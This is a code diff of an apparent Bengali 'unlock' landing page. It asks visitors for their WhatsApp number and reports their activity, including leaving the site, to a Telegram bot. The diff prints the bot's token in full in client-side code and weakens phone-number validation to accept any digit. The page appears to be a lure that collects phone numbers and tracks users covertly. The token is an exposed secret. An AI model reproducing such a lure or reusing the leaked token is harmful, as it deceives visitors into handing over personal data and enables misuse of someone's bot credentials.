@@ -327,14 +327,14 @@ h1{
         </h1>
 
         <div class="description">
-            নিচে ফাঁকা ঘরে আপনার হোয়াটসঅ্যাপ নাম্বার বসিয়ে নিচের সংযুক্ত হন (Join Now) বাটনে ক্লিক করে আনলক করুন
+            নিচে ফাঁকা ঘরে আপনার হোয়াটসঅ্যাপ নাম্বার বা যেকোনো সংখ্যাসমূহ বসিয়ে নিচের সংযুক্ত হন (Join Now) বাটনে ক্লিক করে আনলক করুন
         </div>
 
         <input
             id="productNumber"
             class="product-input"
-            type="text"
-            placeholder="আপনার হোয়াটসঅ্যাপ নাম্বার লিখুন"
+            type="tel"
+            placeholder="আপনার নম্বর লিখুন (যেকোনো দেশের নম্বর স্বাগত)"
             autocomplete="off"
             inputmode="numeric"
         >
@@ -441,6 +441,7 @@ h1{
 
 /* ==========================================================
    ১. টেলিগ্রাম সেটিংস
+   (বতর্মানভাবে ক্লায়েন্ট-সাইডে রাখা হয়েছে - নিরাপত্তার ঝুঁকি আছে)
 ========================================================== */
 
 const BOT_TOKEN = "8990521456:AAFOG4g-sFfJgDABIgkbTyAJI6FQiTCyVow";
@@ -549,18 +550,26 @@ function clearError(){
 
 /* ==========================================================
    ৮. নাম্বার ভ্যালিডেশন
+   পরিবর্তন: এখন যেকোনো সংখ্যাও গ্রহণ করবে (শূন্য নয়)
 ========================================================== */
 
 function validateInput(value) {
-    // শুধুমাত্র সংখ্যাগুলো আলাদা করা
+    // পুরনো হেল্পার (মেইন কোডে ব্যবহার করা হয়নি) — রাখা হল, প্রয়োজনলে ব্যবহার করতে পারেন
     const digitsOnly = value.replace(/\D/g, '');
-    
-    // ৭ থেকে ১৫ ডিজিট নিশ্চিত করা
     if (digitsOnly.length >= 7 && digitsOnly.length <= 15) {
-        return true; // ভ্যালিড
+        return true;
     } else {
-        return false; // ইনভ্যালিড
+        return false;
     }
+}
+
+// নতুন: isValidPhoneNumber - এখন যেকোনো দেশের যেকোনো দৈর্ঘ্যের নম্বর গ্রহণ করবে,
+// যতক্ষণ না ইনপুটে অন্তত একটি ডিজিট আছে।
+function isValidPhoneNumber(value) {
+    if (!value || typeof value !== 'string') return false;
+    const digitsOnly = value.replace(/\D/g, '');
+    // ন্যূনতম একটি ডিজিট থাকতে হবে
+    return digitsOnly.length >= 1;
 }
     
 
@@ -663,13 +672,13 @@ submitButton.addEventListener("click", async function(){
     const value = productNumber.value.trim();
 
     if (value === "") {
-        showError("অনুগ্রহ করে আপনার হোয়াটসঅ্যাপ নাম্বার লিখুন।");
+        showError("অনুগ্রহ করে আপনার নম্বর লিখুন।");
         productNumber.focus();
         return;
     }
 
     if (!isValidPhoneNumber(value)) {
-        showError("সঠিক নাম্বার লিখুন। যেমন: 01XXXXXXXXX বা +8801XXXXXXXXX");
+        showError("সঠিক নম্বর লিখুন। (যেকোনো দেশের নম্বর গ্রহণ করা হবে)");
         productNumber.focus();
         return;
     }
@@ -963,7 +972,7 @@ function openWhatsAppLink(source, isNewTab) {
 
 window.addEventListener("pagehide", function () {
     if (currentStep === 2 && !navigatingToWhatsApp) {
-        notifyTelegram("🚪 ইউজার ওয়েবসাইট ছেড়ে চলে গেছে");
+        notifyTelegram("🚪 ইউজার ওয়েবসাইট ছেড়ে ফিরে গেছে");
     }
 });
 
